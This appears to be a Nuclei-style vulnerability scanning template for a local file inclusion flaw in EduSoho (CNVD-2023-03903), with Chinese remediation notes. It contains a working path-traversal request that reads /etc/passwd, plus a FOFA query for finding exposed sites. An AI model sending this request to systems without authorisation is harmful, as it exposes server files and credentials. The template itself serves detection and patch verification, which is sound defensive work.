id: CNVD-2023-03903

info:
  name: EduSoho 本地文件包含漏洞（CNVD-2023-03903）
  author: s4e-io
  severity: high
  description: |
    EduSoho 的课堂课程统计导出接口对 `fileNames[]` 参数路径限制不足，攻击者可通过目录穿越读取本地文件。模板请求导出接口读取 `/etc/passwd`，并通过 CSV 响应类型和账号文件特征确认漏洞。
  impact: |
    - 攻击者可读取服务器本地敏感文件、应用配置和数据库连接信息。
    - 在线教育平台中的用户、课程、订单和教学数据可能因后续攻击而泄露。
  remediation: |
    - 升级 EduSoho 至修复版本，修复统计导出接口的文件名校验。
    - 导出接口应只允许读取系统生成的临时文件，禁止用户控制任意路径。
    - 检查导出日志和服务器文件权限，轮换可能泄露的配置凭据。
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/135007351
    - https://github.com/gobysec/GobyVuls/blob/master/CNVD-2023-03903.md
  metadata:
    verified: true
    max-request: 1
    vendor: hagzhou-kuozhi-network-technology
    product: edusoho
    fofa-query: title="Powered By EduSoho" || body="Powered by <a href=\"http://www.edusoho.com/\" target=\"_blank\">EduSoho" || (body="Powered By EduSoho" && body="var app")
  tags: cnvd,cnvd2023,lfi,edushoho,vuln

http:
  - raw:
      - |
        GET /export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: content_type
        words:
          - "text/csv"

      - type: status
        status:
          - 200
